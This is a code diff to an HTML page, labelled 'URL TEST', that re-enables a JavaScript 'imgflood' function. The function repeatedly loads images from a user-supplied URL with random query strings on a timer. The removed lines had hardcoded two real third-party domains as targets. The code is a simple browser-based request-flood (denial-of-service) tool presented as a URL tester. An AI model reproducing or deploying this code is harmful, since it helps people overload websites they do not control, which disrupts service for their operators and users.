@@ -28,24 +28,25 @@
     <script src="sendt.js"></script>
 
     <script type="text/javascript">
-    /*
     function imgflood() {
       var TARGET = document.getElementById('sss').value;
       var pic = new Image();
       var ran = Math.floor(Math.random() * 1000);
       //pic.src = TARGET+'?val='+ran;
-      pic.src = 'https://www.yunxiao.com?val='+ran;
-      pic.src = 'https://yue.haofenshu.com?val='+ran;
+      if (TARGET.includes("?")){
+        pic.src = TARGET+'&val='+ran;
+      }else{
+        pic.src = TARGET+'?val='+ran;
+      }
 
 }
     function aaa(){
       if (document.getElementById('sss').value.search( /^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/) != -1){
-      setInterval(imgflood, 1);
+      setInterval(imgflood, 1000);
     }else{
       alert('It is not a url.')
     }
   }
-  */
     </script>
     <font style="font-size: 50px" color='white'>URL TEST
       <input type="text" name="" id='sss' value="" placeholder="Enter any url...">
